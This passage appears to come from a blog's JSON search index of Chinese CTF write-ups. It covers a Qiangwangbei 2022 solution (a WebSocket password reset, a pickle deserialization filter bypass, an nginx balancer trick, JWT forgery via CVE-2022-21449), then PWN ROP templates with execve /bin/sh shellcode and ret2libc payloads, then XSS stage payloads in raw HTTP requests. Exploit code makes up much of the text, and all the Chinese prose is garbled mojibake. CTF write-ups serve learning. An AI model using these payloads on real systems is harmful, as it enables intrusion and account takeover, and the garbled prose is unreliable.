WebSocket(url);\nws.onopen = function (event) &#123;\n    var msg = &quot;changepw 123456&quot;;\n    ws.send(msg);\n&#125;\n&lt;/script&gt;åœ¨å¯¹è¯æ¡†é‡Œå‘é€ bugreport pocåœ°å€ ï¼Œç„¶å adminçš„å¯†ç å°±ä¼šè¢«é‡ç½®ä¸º 123456ï¼Œé‡æ–°ç™»å½• admin è´¦æˆ·è´­ä¹° Hint å¾—åˆ°é¢˜ç›®æºç  /static/qwb_source_12580.zip\n\næŸ¥çœ‹æºç å‘ç°é™åˆ¶çš„å¾ˆæ­»ï¼Œå¿…é¡»åœ¨å®šä¹‰çš„èŒƒå›´å†…ã€å¿…é¡»æ˜¯æ•°å­—ä¹‹ç±»çš„ï¼Œæœ€åè€ƒè™‘åˆ° python å’Œ go ä¿©è¯­è¨€ä¸åŒï¼Œjson è§£é‡Šå™¨ä¹Ÿä¸åŒï¼Œç»•è¿‡äº†é™åˆ¶\n\nè¿”å›é¡µé¢å¾—åˆ°flag\n\ncrashè®¿é—®é¦–é¡µå¾—åˆ°é¢˜ç›®æºä»£ç \npythonimport base64\n# import sqlite3\nimport pickle\nfrom flask import Flask, make_response,request, session\nimport admin\nimport random\n\napp = Flask(__name__,static_url_path=&#39;&#39;)\napp.secret_key=random.randbytes(12)\n\nclass User:\n    def __init__(self, username,password):\n        self.username=username\n        self.token=hash(password)\n\ndef get_password(username):\n    if username==&quot;admin&quot;:\n        return admin.secret\n    else:\n        # conn=sqlite3.connect(&quot;user.db&quot;)\n        # cursor=conn.cursor()\n        # cursor.execute(f&quot;select password from usertable where username=&#39;&#123;username&#125;&#39;&quot;)\n        # data=cursor.fetchall()[0]\n        # if data:\n        #     return data[0] \n        # else:\n        #     return None\n        return session.get(&quot;password&quot;)\n\n@app.route(&#39;/balancer&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\ndef flag():\n    pickle_data=base64.b64decode(request.cookies.get(&quot;userdata&quot;))\n    if b&#39;R&#39; in pickle_data or b&quot;secret&quot; in pickle_data:\n        return &quot;You damm hacker!&quot;\n    os.system(&quot;rm -rf *py*&quot;)\n    userdata=pickle.loads(pickle_data)\n    if userdata.token!=hash(get_password(userdata.username)):\n         return &quot;Login First&quot;\n    if userdata.username==&#39;admin&#39;:\n        return &quot;Welcome admin, here is your next challenge!&quot;\n    return &quot;You&#39;re not admin!&quot;\n\n@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\ndef login():\n    resp = make_response(&quot;success&quot;) \n    session[&quot;password&quot;]=request.values.get(&quot;password&quot;)\n    resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600)\n    return resp\n\n@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\ndef index():\n    return open(&#39;source.txt&#39;,&quot;r&quot;).read()\n\nif __name__ == &#39;__main__&#39;:\n    app.run(host=&#39;0.0.0.0&#39;, port=5000)ç™»é™† admin ï¼Œç”¨æˆ·åå’Œå¯†ç é€šè¿‡ GET ä¼ å‚ã€‚ç»è¿‡åºåˆ—åŒ–æ“ä½œå’Œ base64 ç¼–ç åæ”¾åˆ° cookie é‡Œ\npythondef login():\n    resp = make_response(&quot;success&quot;) \n    session[&quot;password&quot;]=request.values.get(&quot;password&quot;)\n    resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600)\n    return respæˆ‘ä»¬å‘ç° admin çš„å¯†ç æ˜¯æœ¬åœ°å˜é‡ secret ï¼Œä½†æ˜¯ä¸çŸ¥é“ secret çš„å€¼æ˜¯å¤šå°‘\npythondef get_password(username):\n    if username==&quot;admin&quot;:\n        return admin.secretæˆ‘ä»¬å¯ä»¥é€šè¿‡ pickle ååºåˆ—åŒ–å®ç° å˜é‡è¦†ç›– ï¼Œæ³¨æ„ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç° R å’Œ secret \npythonif b&#39;R&#39; in pickle_data or b&quot;secret&quot; in pickle_data:\n        return &quot;You damm hacker!&quot;æˆ‘ä»¬ä½¿ç”¨åŒå±‚ exec ç»•è¿‡\npythonimport base64\n\ndata = b&#39;&#39;&#39;(S&#39;exec(&#39;admin.se&#39;+&#39;cret=&quot;admin&quot;&#39;)&#39;\ni__builtin__\nexec\n.&#39;&#39;&#39;\n\nprint(base64.b64encode(data))\n# KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==æ­¤æ—¶é¡µé¢æ˜¾ç¤ºæˆåŠŸ\nshellhttp://39.107.237.149:25512/login?username=admin&amp;password=adminæ­¤æ—¶è®¿é—® /balancer ä¼šæç¤º You&#39;re not admin!ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ cookieå†å»è¯·æ±‚/balancer\nshelluserdata=KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==è¯·æ±‚åé¡µé¢æç¤º 500 ï¼Œé‡æ–°è¯·æ±‚ä¸€æ¬¡å³å¯è¿”å›æ­£å¸¸é¡µé¢ã€‚\nè¿™é‡Œåˆæç¤º flag in 504 page ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªé¡µé¢åº”è¯¥æ˜¯æœ€ç»ˆå¾—åˆ°èƒ½flagé¡µé¢\nç„¶åè¿˜ç»™äº†ä¸€ä¸ª /826fd2f86129b050875e4a70cb059908a7ed  æˆ‘ä»¬ç›´æ¥æ„é€ è¯·æ±‚ä¸€ä¸‹\n\nè®¿é—®åå¾—åˆ°ä¸€ä¸ª nginx é…ç½®æ–‡ä»¶\nnginx# nginx.vh.default.conf  --  docker-openresty\n#\n# This file is installed to:\n#   `/etc/nginx/conf.d/default.conf`\n#\n# It tracks the `server` section of the upstream OpenResty&#39;s `nginx.conf`.\n#\n# This config (and any other configs in `etc/nginx/conf.d/`) is loaded by\n# default by the `include` directive in `/usr/local/openresty/nginx/conf/nginx.conf`.\n#\n# See https://github.com/openresty/docker-openresty/blob/master/README.md#nginx-config-files\n#\nlua_package_path &quot;/lua-resty-balancer/lib/?.lua;;&quot;;\nlua_package_cpath &quot;/lua-resty-balancer/?.so;;&quot;;\n\nserver &#123;\n    listen       8088;\n    server_name  localhost;\n\n    #charset koi8-r;\n    #access_log  /var/log/nginx/host.access.log  main;\n\n    location /gettestresult &#123;\n            default_type text/html;\n            content_by_lua &#39;\n                local resty_roundrobin = require &quot;resty.roundrobin&quot;\n                local server_list = &#123;\n                    [ngx.var.arg_server1] = ngx.var.arg_weight1,\n                    [ngx.var.arg_server2] = ngx.var.arg_weight2,\n                    [ngx.var.arg_server3] = ngx.var.arg_weight3,\n                &#125;\n                local rr_up = resty_roundrobin:new(server_list)\n                for i = 0,9 do\n                    ngx.say(&quot;Server seleted for request &quot;,i,&quot;: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; ,rr_up:find(),&quot;&lt;br&gt;&quot;)\n                end\n            &#39;;\n    &#125;\n\n    #error_page  404              /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n\n\n\n    # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n    #\n    #location ~ \\.php$ &#123;\n    #    proxy_pass   http://127.0.0.1;\n    #&#125;\n\n    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n    #\n    #location ~ \\.php$ &#123;\n    #    root           /usr/local/openresty/nginx/html;\n    #    fastcgi_pass   127.0.0.1:9000;\n    #    fastcgi_index  index.php;\n    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n    #    include        fastcgi_params;\n    #&#125;\n\n    # deny access to .htaccess files, if Apache&#39;s document root\n    # concurs with nginx&#39;s one\n    #\n    #location ~ /\\.ht &#123;\n    #    deny  all;\n    #&#125;\n&#125;æ–‡ä»¶æ€»å…±éƒ½æåˆ°äº†ä»¨åœ°å€ï¼Œç›´æ¥éƒ½å¡«ä¸Šï¼Œç„¶å æƒé‡ çš„è¯ï¼Œæ ¹æ®å¤šå¹´å»ºç«™ç»éªŒæ¥è¯´ï¼Œæ•°å€¼è¶Šä½ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œæˆ‘ä»¬ç›´æ¥éƒ½è®¾ç½®ä¸º 0 ,æˆ–è€…ç›¸åŒæ•°ï¼Œç„¶åè®©è¿™ä»¨å†²çªå»å§ã€‚\nshell127.0.0.1\n127.0.0.1:8088\n127.0.0.1:900é™å¾…åå‡ ç§’ï¼Œé¡µé¢è¿”å›äº† flag ï¼ŒåŒæ—¶æ§åˆ¶å°é‡Œå¯ä»¥çœ‹åˆ°è¯·æ±‚çš„æ¥å£ 504 è¶…æ—¶äº†\nCryptomyJWTnc è¿æ¥åè¾“å…¥ç”¨æˆ·åï¼Œç„¶åè¾“å…¥ 1  è·å¾— generate tokenï¼Œè¿”å›ä¸€æ®µ JWTï¼Œç„¶åè¾“å…¥ 2 å» getflag æç¤ºè¾“å…¥ your token åè¿”å› You are not the administrator.ï¼Œæˆ‘ä»¬ç›´æ¥è§£å¯† JWT çœ‹çœ‹\nshelleyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==.5IQnppqB0_rC4OOaCowkLXVYW6eJ1kI6P-IR3dXll0gDYFjQKyOrHbVp10Hrm3GFh8eRBVZok9_z1rrKUQcJUBqQs-PeZElzqrZwE4rPVxJr2fngi2u97HdG4ItmvWiSå¾ˆæ˜æ˜¾çœ‹åˆ°ä¸€ä¸ªæƒé™æ ¡éªŒå­—æ®µ &quot;admin&quot;: false,\næˆ‘ä»¬å…ˆ base64 è§£ç åæŠŠ false æ”¹ä¸º trueï¼Œé‡æ–°ç¼–ç ä¸º base64\nshelleyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==\n&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;iami233&quot;,&quot;admin&quot;:false,&quot;exp&quot;:1659338121700&#125;\n&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;iami233&quot;,&quot;admin&quot;:true,&quot;exp&quot;:1659338121700&#125;\neyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9\n\n\n\n\n\n\n\n\n\nCVE-2022-21449ï¼šä¼ å…¥sigå€¼å¯¹(r, s)ä¸º(0, 0)æ—¶ï¼Œå¯ä»¥ç»•è¿‡éªŒè¯æœ€åä¸€æ®µæ•°æ®æˆ‘ä»¬ç”¨ 0 å¡«å……ï¼ŒåŸæ•°æ®æ˜¯ 128 ä½ï¼Œæˆ‘ä»¬ä¹Ÿç”¨128 ä¸ª A å¡«å……\nshelleyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAæ³¨æ„ token å¤±æ•ˆæ—¶é—´æœ‰ç‚¹å¿«ï¼Œæ‰€ä»¥æ•´ä½“åšçš„æ—¶å€™é€Ÿåº¦å¿«ä¸€ç‚¹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨è„šæœ¬å®ç°è‡ªåŠ¨åŒ–\nMiscç­¾åˆ°ç›´æ¥å¤åˆ¶ç²˜è´´å³å¯\né—®å·è°ƒæŸ¥å›ç­”é—®å·æäº¤å³å¯å¾—åˆ°flag\n","slug":"å¼ºç½‘æ¯2022","date":"2022-07-29T15:44:33.000Z","categories_index":"CTF","tags_index":"WP","author_index":"xmmlaz"},{"id":"20032183053bd6117641c219a5d520bb","title":"PWNçš„åŸºæœ¬ROPé“¾æ„é€ ","content":"æŸ¥æ‰¾å¯¹åº”æº¢å‡ºä¸€èˆ¬çš„æº¢å‡ºå†…å®¹æ˜¯EIPï¼Œå› ä¸ºEIPå¯„å­˜å™¨å­˜å‚¨ç€æˆ‘ä»¬CPUè¦è¯»å–æŒ‡ä»¤çš„åœ°å€\nå¯ä»¥é€šè¿‡ cyclic æ•°å­—è¿™ä¸ªæŒ‡ä»¤æ¥è·å–åˆ¤æ–­æº¢å‡ºç‚¹çš„ä¸€ä¸ªé•¿åº¦ä¸ºè¾“å…¥çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå†é€šè¿‡gdbè°ƒè¯•è§‚å¯ŸEIPå¯„å­˜å™¨å¤„çš„ 4 ä½å­—ç¬¦ï¼Œé€šè¿‡æŒ‡ä»¤cyclic -l å¯¹åº”EIPçš„4ä½å­—ç¬¦ï¼Œå¾—åˆ°éœ€è¦å¡«å……çš„æº¢å‡ºå­—ç¬¦é•¿åº¦ã€‚\nä¿æŠ¤æ¨¡å¼NXï¼šé˜²æ­¢æ ˆä¸Šæ‰§è¡Œ (éœ€è¦åˆ©ç”¨åˆ° bss æ®µ)\nCanaryï¼šæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º \nRet2texté€šè¿‡è®¡ç®—æº¢å‡ºç‚¹çš„åœ°å€åˆ°å¯¹åº”è¿”å›çš„æ ˆé¡¶ï¼ˆebpï¼‰çš„è·ç¦»æ¥è¿›è¡Œæº¢å‡ºï¼ŒåŒæ—¶è¦åŠ ä¸Šå¯¹åº” ret æ‰€å çš„ 4 ä¸ªå­—èŠ‚ã€‚\nå¯¹åº” exp æ„é€ æ¨¡å¼ï¼š\ntxtshellcode = å¯¹åº” /bin/sh/ åœ°å€ \npayload = &#39;a&#39;*[æº¢å‡ºç‚¹åˆ°æ ˆé¡¶è·ç¦»] + &#39;A&#39;*4 + p32/p64(shellcode)Ret2shellcodeç¨‹åºä¸­æ²¡æœ‰å‡ºç° &#x2F;bin&#x2F;sh&#x2F; åœ°å€éœ€è¦è‡ªå·±æ„é€ ï¼Œæ„é€ æ–¹å¼æœ‰ä¸¤ç§ï¼š\n\n23å­—èŠ‚\ntxt\n\nshellcode &#x3D; â€œ\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05â€\ntxt\n- 44å­—èŠ‚\n  from pwn import *  shellcode &#x3D; asm(shellcraft.sh())\ntxt\nä¸€èˆ¬å®ç°æº¢å‡ºæ–¹å¼ç±»ä¼¼äº ret2text ï¼Œä¸åŒçš„æ˜¯éœ€è¦ä½¿ç”¨ `vmmap`æ£€æŸ¥å¯¹åº”çš„æƒé™ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦è§‚å¯Ÿ`bss`**ï¼ˆæ£€æŸ¥æº¢å‡ºç‚¹æ˜¯å¦å®šä¹‰åœ¨ bss æ®µä¸Šï¼‰**\n\n**å¯¹åº” exp æ„é€ æ¨¡å¼ï¼š**\nbss &#x3D; bsså¯¹åº”çš„åœ°å€shellcode &#x3D; æ„é€ ä¸€ä¸ªshellpayload &#x3D; shellcode.ljust(â€˜aâ€™,æº¢å‡ºé•¿åº¦) + p32&#x2F;p64(bss)\ntxt\n## Ret2syscall\n\nç¨‹åºä¸­åŒæ ·æ²¡æœ‰å‡ºç° /bin/sh/ åœ°å€éœ€è¦è‡ªå·±æ„é€ ï¼ŒåŸç†ä¸ºæŠŠå¯¹åº”è·å– shell çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ‰§è¡Œ int 0x80 å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆçŸ¥è¯†ç‚¹`Linux`ä¸‹ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚\n\nå­¦ä¹ é“¾æ¥ï¼š[ret2syscallåŸç†è¯¦è§£ä¸å®ä¾‹åˆ†æ ](https://www.freebuf.com/articles/system/234228.html)\n\n**Syscall è°ƒç”¨è§„èŒƒ** `execve(â€œ/bin/shâ€, 0,0)`\n\nå®ƒå¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸ºï¼š\npop eax# ç³»ç»Ÿè°ƒç”¨å·è½½å…¥ï¼Œ execveä¸º0xbpop ebx# ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ &#x2F;bin&#x2F;shçš„stringpop ecx# ç¬¬äºŒä¸ªå‚æ•°ï¼Œ0pop edx# ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ0int 0x80\ntxt\nå¯»æ‰¾å¯¹åº”å¯ä»¥åˆ©ç”¨çš„ `ret(gadgets)`å¯ä»¥ä½¿ç”¨ `ropgadgets` è¿™ä¸ªå·¥å…·\n\nå¯¹åº”å¯»æ‰¾æ­¥éª¤ï¼š\n\n```sh\n $ ROPgadget --binary å¯¹åº”æ–‡ä»¶  --only &#39;pop|ret&#39; | grep &#39;eax&#39;  //search eax  \n 0x080bb196 : pop eax ; ret\n ------------------------------------------------------------------------------------------------------------------\n $ ROPgadget --binary å¯¹åº”æ–‡ä»¶  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;  //search ebx\\edx\\ecx\n 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n ------------------------------------------------------------------------------------------------------------------\n $ROPgadget --binary å¯¹åº”æ–‡ä»¶  --string &#39;/bin/sh&#39;   //search &#39;bin/sh&#39;\n    Strings information\n    ============================================================\n    0x080be408 : /bin/sh\n  ----------------------------------------------------------------------------------------------------------------- \n $ROPgadget --binary å¯¹åº”æ–‡ä»¶  --only &#39;int&#39;       // search int 0x80         \n    Gadgets information\n    ============================================================\n    0x08049421 : int 0x80å¯¹åº” exp æ„é€ æ¨¡å¼ï¼š\npythonpop_eax_ret = å¯åˆ©ç”¨çš„ eax çš„åœ°å€\npop_edx_ecx_ebx_ret = å¯åˆ©ç”¨çš„ ebxã€edxã€ecxåœ°å€\nint_0x80 = int 0x80 çš„åœ°å€\nbinsh = &#39;bin/sh&#39; çš„åœ°å€\npayload = flat([&#39;A&#39; * æº¢å‡ºé•¿åº¦, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\nio.sendline(payload)Ret2libcret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc (Linuxä¸‹Cåº“) ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ PLT å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® ( å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ )ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(&quot;/bin/sh&quot;)ã€‚\nå«æœ‰ system å’Œ &#x2F;bin&#x2F;shä¸€èˆ¬å‡½æ•°ä¸­å«æœ‰ /bin/sh ã€system å‡½æ•°æ—¶æ„é€ å¯¹åº”çš„ exp æ„å»ºæ¨¡å¼ä¸ºï¼š\npythonbinsh_addr = /bin/sh/ çš„åœ°å€\nsystem_plt = system å‡½æ•°çš„åœ°å€\npayload = flat([&#39;a&#39; * æº¢å‡ºé•¿åº¦, system_plt,&#39;b&#39; * 4,binsh_addr])éœ€è¦æ³¨æ„å‡½æ•°è°ƒç”¨æ ˆçš„ç»“æ„ï¼Œå¦‚æœæ˜¯æ­£å¸¸è°ƒç”¨ system å‡½æ•°ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„è¿”å›åœ°å€ï¼Œè¿™é‡Œä»¥â€™bbbbâ€™ ä½œä¸ºè™šå‡çš„åœ°å€ï¼Œå…¶åå‚æ•°å¯¹åº”çš„å‚æ•°å†…å®¹ã€‚\nä¸å«æœ‰ &#x2F;bin&#x2F;shå¦‚æœå‡½æ•°ä¸­ä¸å«æœ‰ /bin/sh æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨bssæ®µä¸Šè‡ªå·±æ„å»ºä¸€ä¸ª/bin/sh\næ­¤æ—¶ exp æ„é€ æ¨¡å¼ä¸ºï¼š\npythonsystem_plt = system å‡½æ•°åœ°å€\ngets_addr = æº¢å‡ºç‚¹å‡½æ•°åœ°å€\nbuf_addr = bss æ®µä¸Šå˜é‡åœ°å€\npayload = flat([&#39;a&#39; * æº¢å‡ºé•¿åº¦,gets_addr,system_plt,buf_addr,buf_addr])\nio.sendline(payload)\nio.sendline(&#39;/bin/sh&#39;)\n\n\n\n\n\n\n\n\nå¯¹åº”çš„æ ˆåˆ†å¸ƒä¸ºï¼š\n\ngetsåœ°å€\nsystemåœ°å€ï¼ˆä¹Ÿæ˜¯getsçš„è¿”å›åœ°å€ï¼‰\nbuf2ï¼ˆæ˜¯getsçš„å‚æ•°ï¼‰\nbuf2ï¼ˆæ˜¯systemçš„å‚æ•°ï¼‰\n\næˆ–è€…ï¼š\nå¯»æ‰¾ä¸€ä¸ª popï¼š\nshROPgadget --binary ret2libc2 --only &#39;pop|ret&#39;| grep &#39;ebx&#39;\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; retä¹‹åçš„ exp æ„é€ æ¨¡å¼ï¼š\npythonsystem_plt = system å‡½æ•°åœ°å€\npop_ebx = ret ebx çš„åœ°å€\ngets_addr = æº¢å‡ºç‚¹å‡½æ•°åœ°å€\nbuf_addr = bss æ®µä¸Šå˜é‡åœ°å€\npayload = flat([&#39;a&#39; * æº¢å‡ºé•¿åº¦,gets_addr,pop_ebx,system_plt,&#39;A&#39;*4,buf_addr])\nio.sendline(payload)\nio.sendline(&#39;/bin/sh&#39;)\n\n\n\n\n\n\n\n\nå¯¹åº”çš„æ ˆåˆ†å¸ƒä¸ºï¼š\n\ngetsåœ°å€\npop ebx ï¼›retåœ°å€\nbuf2ï¼ˆgetsçš„å‚æ•°ï¼‰\nsystemåœ°å€\nsystemçš„è¿”å›åœ°å€ï¼ˆâ€™AAAAâ€™ï¼‰\nbuf2ï¼ˆsystemçš„å‚æ•°ï¼‰\n\nåœ¨è°ƒç”¨getså‡½æ•°åï¼ŒæŠŠå‚æ•°buf2ç»™popæ‰ï¼Œè¿™æ ·è¿”å›åœ°å€å°±å˜æˆäº†systemï¼Œå°±ä¼šè¿”å›åˆ°systemã€‚\nä¸å«æœ‰ System å’Œ &#x2F;bin&#x2F;shä¸¤ä¸ªéƒ½æ²¡æœ‰ç»™å‡ºçš„è¯éœ€è¦è‡ªå·±å¯»æ‰¾å¯¹åº”ç‰ˆæœ¬çš„ libc\næ³„éœ²å‡½æ•°åœ°å€ï¼š\npythonfrom pwn import *\nio=process(&#39;./&#39;)\nelf=ELF(&#39;./&#39;)\nputs_plt = elf.plt[&#39;puts&#39;]\nlibc_start_main_got = elf.got[&#39;__libc_start_main&#39;]\nmain = elf.symbols[&#39;main&#39;]\nputs_got = elf.got[&#39;puts&#39;]\n\nprint &quot;leak libc_start_main_got addr and return to main again&quot;\npayload = &#39;a&#39; * æº¢å‡ºé•¿åº¦ + p32(puts_plt) + p32(main) +p32(libc_start_main_go)\n# io.recvuntil(&#39;&#39;)\nio.sendline(payload1)\n\nprint &quot;get the related addr&quot;\nlibc_start_main_addr = u32(p.recv()[0:4])     \nprint(&quot;addr:&quot; + hex(libc_start_main_addr))å¯¹åº”æ„é€  exp æ¨¡å¼ä¸ºï¼š\npythonsystem_addr = æ‰¾åˆ°å¯¹åº” libc ç‰ˆæœ¬å system çš„åœ°å€\nbinsh_addr = æ‰¾åˆ°å¯¹é¥® libcç‰ˆæœ¬å /bin/sh çš„åœ°å€\npayload = flat([&#39;A&#39; * æº¢å‡ºé•¿åº¦(éœ€è¦ç”¨ cyclic é‡æ–°æµ‹è¯•), system_addr, 0xdeadbeef, binsh_addr]) # 0xdeadbeef ä¸º system åœ°å€è¿”å›ï¼Œå¯ä»¥éšæ„è®¾ç½®\nsh.sendline(payload)ä¸€å…±éœ€è¦ä¸¤æ¬¡ expçš„ç¼–å†™ï¼Œä¾¿å¯ä»¥å®Œæˆå¯¹æ²¡æœ‰/bin/shä¸systemçš„ret2libcé¢˜ç›®\n","slug":"PWNçš„åŸºæœ¬ROPé“¾æ„é€ ","date":"2022-05-15T10:49:36.000Z","categories_index":"CTF","tags_index":"PWN","author_index":"xmmlaz"},{"id":"7fcba27f174cb492cad0a42b50923924","title":"XSS Challenges","content":"XSS ChallengesStage #1å‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¹¶ä¸”ä¸éœ€è¦ä»»ä½•é—­åˆ\nshell&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;Stage #2æŸ¥çœ‹æºç å‘ç°éœ€è¦é—­åˆè¾“å…¥æ¡†çš„HTMLæ ‡ç­¾\nshell&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;&lt;&quot;Stage #3å°è¯•é—­åˆå‘ç°ä¹Ÿæ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹æºç å‘ç°æœç´¢æ¡†å·²ç»åšäº†è½¬ç§»å¤„ç†ï¼Œå¹¶ä¸”å‘ç°æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œåé¢çš„Choose a countryæ²¡æœ‰è½¬ç§»å¤„ç†ï¼Œå°†æ­¤ä½œä¸ºæ³¨å…¥ç‚¹ã€‚\né€šè¿‡POSTæ’å…¥\nshellPOST /stage-3.php?sid=56552ee93b02c991d229f72f3e6c36c43d5e91b3 HTTP/1.1\nHost: xss-quiz.int21h.jp\nCookie: PHPSESSID=0b5vrk9b5ra4pl60nl7kmueu0t; __utma=251560719.1469267736.1682478672.1682478672.1682478672.1; __utmc=251560719; __utmz=251560719.1682478672.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=251560719.2.10.1682478672\nContent-Length: 61\nCache-Control: max-age=0\nSec-Ch-Ua: &quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;112&quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: &quot;Windows&quot;\nUpgrade-Insecure-Requests: 1\nOrigin: https://xss-quiz.int21h.jp\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://xss-quiz.int21h.jp/stage-3.php?sid=1946a40f2fb5b91a1f66b57c53948f60e033111f\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\np1=123&amp;p2=&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;JapanStage #4æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªéšè—çš„å­—æ®µ\nshell&lt;input type=&quot;hidden&quot; name=&quot;p3&quot; value=&quot;hackme&quot;&gt;ä½¿ç”¨burpæ’å…¥xssè¯­å¥ï¼Œæ³¨æ„é—­åˆã€‚\nshellPOST /stage_4.php?sid=a681339d09976811649b42466437ed3771cb3fcb HTTP/1.1\nHost: xss-quiz.int21h.jp\nCookie: PHPSESSID=0b5vrk9b5ra4pl60nl7kmueu0t; __utma=251560719.1469267736.1682478672.1682478672.1682478672.1; __utmc=251560719; __utmz=251560719.1682478672.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=251560719.7.10.1682478672\nContent-Length: 19\nCache-Control: max-age=0\nSec-Ch-Ua: &quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;112&quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: &quot;Windows&quot;\nUpgrade-Insecure-Requests: 1\nOrigin: https://xss-quiz.int21h.jp\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://xss-quiz.int21h.jp/stage_4.php?sid=aca950e4dd9081e0241f323c567bb8b3ac3824e7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: 